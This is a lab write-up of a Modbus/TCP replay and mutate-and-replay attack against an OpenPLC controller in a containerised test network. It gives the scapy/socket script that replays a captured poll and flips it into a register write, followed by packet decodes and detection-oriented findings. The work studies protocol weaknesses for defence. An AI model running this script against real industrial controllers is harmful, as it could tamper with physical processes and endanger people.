# Phase 2 Scenario 5 — Modbus replay attack

**Date:** 2026-05-22
**Source task:** Phase 2 attack scenarios (step 2 of Phase 2)
**Attacker vantage:** `otlab-attacker` multi-homed on `ot_zone`
(`172.18.0.4`), target `openplc:502` (`172.18.0.2`).
**Source artifact:** pre-flight baseline pcap
`captures/phase2-baseline-clean-2026-05-22.pcap`, captured before
the attacker crossed the boundary.

---

## Setup

This scenario is qualitatively different from scenarios 2–4b. Those
test what the PLC *accepts* over Modbus — access-control semantics.
This scenario tests **protocol-level authentication and integrity**:
can an attacker take a legitimate, captured PDU and reuse it? Can
they mutate it before reuse? The answers are independent of the
access-control story.

Capture vantage: `tcpdump -i any` inside `otlab-openplc`. Filter
`'tcp port 502'`.

---

## Prediction (stated before running)

Modbus/TCP has no authentication and no integrity protection by
design (`docs/network-security.md` §5.2). Concretely:

1. **Verbatim replay should succeed.** The captured PDU's MBAP
   Transaction ID (TID) is a client-chosen field; the PLC echoes
   it back without verification. There is no nonce, no monotonic
   sequence number, no per-connection state the server compares
   against. A replay from the attacker's source IP, with FUXA's
   original TID, should produce a normal PLC response.
2. **Mutate-and-replay should succeed.** With no integrity check,
   an attacker can flip individual PDU bytes (e.g., change FC 3
   read into FC 6 write, change the target address, change the
   value) and the PLC will process the result as if it were a
   fresh, valid request. This is the more interesting test:
   verbatim replay shows the lack of authentication; mutate-and-
   replay shows the lack of integrity.
3. **The §5.3 reassertion wall still holds.** A successful FC 6
   write via mutate-and-replay still targets a PLC-output HR; the
   PLC will overwrite the falsified value within ~1 scan, as it
   did for scenarios 3, 4, 4b. The replay is not a path around
   §5.3 — it is a path to *bypass FUXA-as-the-only-writer*.

---

## Commands

```bash
docker cp ./captures/phase2-baseline-clean-2026-05-22.pcap \
  otlab-attacker:/tmp/baseline.pcap

docker exec -d otlab-openplc sh -c \
  "tcpdump -i any -U -w /tmp/scenario-5.pcap 'tcp port 502'"
sleep 2

docker exec -i otlab-attacker python3 - <<'PY'
from scapy.all import rdpcap, TCP, IP, Raw
import socket

pkts = rdpcap('/tmp/baseline.pcap')
captured = None
for p in pkts:
    if TCP in p and p[TCP].dport == 502 and Raw in p:
        captured = bytes(p[Raw].load)
        src_ip = p[IP].src
        break

# Decode MBAP header
tid = int.from_bytes(captured[0:2], 'big')
fc  = captured[7]
print(f"CAPTURED from {src_ip}: {captured.hex()}  (TID=0x{tid:04x} FC={fc})")

# Step 1: verbatim replay
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('openplc', 502))
s.send(captured)
resp = s.recv(1024)
print(f"REPLAY response: {resp.hex()}  TID=0x{int.from_bytes(resp[0:2],'big'):04x}")
s.close()

# Step 2: mutate FC3 read -> FC6 write of HR1=4242, replay
mutated = bytearray(captured)
mutated[7]    = 6                               # FC -> 6
mutated[8:10] = (1).to_bytes(2, 'big')          # addr = HR1
mutated[10:12] = (4242).to_bytes(2, 'big')      # value = 4242
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.connect(('openplc', 502))
s2.send(bytes(mutated))
resp2 = s2.recv(1024)
print(f"MUTATED response: {resp2.hex()}  FC={resp2[7]}")
s2.close()

# Step 3: read HR1 immediately to confirm reassertion
s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s3.connect(('openplc', 502))
s3.send(b'\x00\x42\x00\x00\x00\x06\x01\x03\x00\x01\x00\x01')  # FC3 read HR1
rb = s3.recv(1024)
print(f"VERIFY HR1 = {int.from_bytes(rb[9:11], 'big')}")
s3.close()
PY

sleep 3
docker exec otlab-openplc pkill tcpdump
docker cp otlab-openplc:/tmp/scenario-5.pcap \
  ./captures/phase2-scenario-5-replay-2026-05-22.pcap
```

---

## Observed output

```
CAPTURED        legitimate Modbus request from 172.19.0.3 -> openplc:502
                PDU bytes (12): 00a300000006010300000003
                MBAP   TID=0x00a3 PID=0 LEN=6 UID=1 FC=3
                PDU    FC=3 read_holding_regs(addr=0, count=3)

=== REPLAY (verbatim) ===
REPLAY          new TCP conn 172.18.0.4:40050 -> openplc:502
REPLAY          sending captured PDU verbatim (12 bytes)
REPLAY          response (15 bytes): 00a300000009010306003800140050
REPLAY          response MBAP TID=0x00a3 FC=3
REPLAY          [OK] response TID matches captured TID — PLC processed the replay as legitimate
REPLAY          regs returned: [56, 20, 80]

=== MUTATE (turn the captured FC3 read into an FC6 write) ===
MUTATE          mutated PDU bytes:    00a300000006010600011092
MUTATE          becomes FC6 write_register(addr=1, value=4242)
MUTATE          response (12 bytes): 00a300000006010600011092
MUTATE          response MBAP TID=0x00a3 FC=6
MUTATE          [OK] PLC accepted the mutated PDU as a valid write request
VERIFY          read HR1 immediately after mutated-write: 20
```

### Byte-by-byte decode of the verbatim replay

**Captured request** (FUXA's normal FC 3 poll, taken from the baseline pcap):

```
00 a3   - TID  = 0x00a3   (FUXA's chosen transaction id)
00 00   - PID  = 0         (Modbus protocol id)
00 06   - LEN  = 6         (bytes that follow)
01      - UID  = 1         (slave id)
03      - FC   = 3         (read holding registers)
00 00   - addr = 0         (HR 0)
00 03   - count= 3         (HR 0..2)
```

**Replayed response** (PLC's reply when WE — not FUXA — sent that exact PDU):

```
00 a3   - TID  = 0x00a3   ← MATCHES captured TID; PLC echoed it back
00 00   - PID  = 0
00 09   - LEN  = 9
01      - UID  = 1
03      - FC   = 3
06      - byte count = 6
00 38   - HR0 = 56  (current tank level %)
00 14   - HR1 = 20  (SP_Low default)
00 50   - HR2 = 80  (SP_High default)
```

The PLC sent live tank-fill data back to the attacker, with the
attacker using FUXA's original transaction id. From the PLC's
perspective there is no signal that this was a replay rather than
a fresh poll.

### Byte-by-byte decode of the mutate-and-replay

**Mutated PDU** (FC 3 read flipped into FC 6 write):

```
00 a3   - TID  = 0x00a3   (still FUXA's old TID — no nonce check)
00 00   - PID  = 0
00 06   - LEN  = 6
01      - UID  = 1
06      - FC   = 6         ← changed from 0x03
00 01   - addr = 1         ← was "count=3"; now address (HR 1 = SP_Low)
10 92   - value= 0x1092 = 4242   ← was tail of original payload; now value
```

Only three bytes changed (FC, plus reinterpretation of the two
payload bytes). The MBAP header is untouched. No checksum, no
HMAC, no sequence number prevents this.

**PLC response**:

```
00 a3   - TID echoed
00 00   - PID
00 06   - LEN  = 6
01      - UID
06      - FC   = 6
00 01   - addr = 1
10 92   - value= 4242
```

This is the standard FC 6 echo-back acknowledgment. The PLC
accepted the write. Then the immediate VERIFY read returned HR1 =
**20** — the PLC's reassertion overwrote our 4242 within ~1 scan,
consistent with §5.3 and scenarios 3, 4, 4b.

### Packet capture summary

- `captures/phase2-scenario-5-replay-2026-05-22.pcap`
- 5.6 KB, 60 packets
- Three separate TCP connections from the attacker (each replay /
  mutate / verify opens a fresh socket — Python `socket` close at
  end of each step)
- Attacker→openplc PUSH packets visible at 19:08:37.967764 (replay),
  19:08:38.024085 (mutate), 19:08:38.124567 (verify) — all from
  source 172.18.0.4 in `ot_zone`, target 172.18.0.2:502, each
  carrying a 12-byte payload

---

## Findings (plain English)

1. **Modbus has no authentication — a captured frame replays cleanly.**
   The attacker took a legitimate FUXA poll out of the baseline pcap
   and re-sent the exact same bytes from a completely different
   source IP on a different network segment. The PLC responded with
   live tank data, echoing FUXA's transaction ID. From any
   server-side log this looks indistinguishable from a real FUXA
   poll except for the source IP.

2. **Modbus has no integrity protection — three bytes flipped, the
   PLC accepted the result as a fresh write.** Mutating the function
   code byte and the trailing two payload bytes turned a read into
   a write to a different address with a different value. No
   checksum, MAC, or sequence number objects to the change.

3. **The §5.3 reassertion wall still applies.** The mutated write
   succeeded at the protocol layer, but the falsified value (4242)
   was overwritten by the PLC's next scan; the immediate VERIFY
   read returned the reasserted default (20). So replay /
   mutate-and-replay does NOT bypass the architectural property
   §5.3 documents; it bypasses the implicit assumption "only FUXA
   writes to the PLC." A defender who would have inspected source
   IP cannot rely on TID, FC, address, or any payload field to
   distinguish FUXA's traffic from a clever attacker's.

4. **For Suricata in step 3, this scenario sharpens the detection
   rule for writes.** Earlier scenarios established the rule
   shape: "write FC from a source IP that is not FUXA." Scenario 5
   confirms that's the only signal — payload content cannot be
   relied on because an attacker can match FUXA's TID and PDU
   format exactly, and address/value/FC are all freely mutable.

5. **The protocol-level lesson is the strongest part of the entire
   Phase 2 attack-scenario suite.** Scenarios 2–4b proved Modbus
   has no access control. Scenario 5 proves it has no
   authentication and no integrity. Combined: an attacker who
   reaches `ot_zone` can both *forge* arbitrary requests AND
   *replay* legitimate ones with mutations. The only real defense
   at this layer is network segmentation (Phase 1 §4, Phase 2 §1)
   plus detection (Phase 2 step 3, Suricata).

---

## Cross-references

- `docs/network-security.md` §5.2 — "Modbus has no security" — empirically
  confirmed for both authentication (verbatim replay) and integrity
  (mutate-and-replay).
- `docs/network-security.md` §5.3 — reassertion wall still applies
  to writes delivered by replay/mutation; replay is not a way
  around §5.3, it is a way to bypass "only FUXA is a writer."
- `docs/monitoring.md` §5 row 1 (any write FC) — triggered (FC 6
  via mutation).
- `docs/monitoring.md` §5 row 2 (new source IP to :502) — triggered.
- `captures/phase2-scenario-5-replay-2026-05-22.pcap` (gitignored,
  5.6 KB, 60 packets).
- `captures/phase2-baseline-clean-2026-05-22.pcap` (gitignored,
  source of the captured PDU).

---

## Hand-off to Step 4 (detach + verify)

Five scenarios complete. The attacker has been on `ot_zone` for
the full duration of scenarios 1–5. Step 4 disconnects the attacker
from `ot_zone`, returning the lab to its post-Phase-2-step-1 state,
and re-verifies the boundary holds (same negative checks as Phase 2
Findings §1).
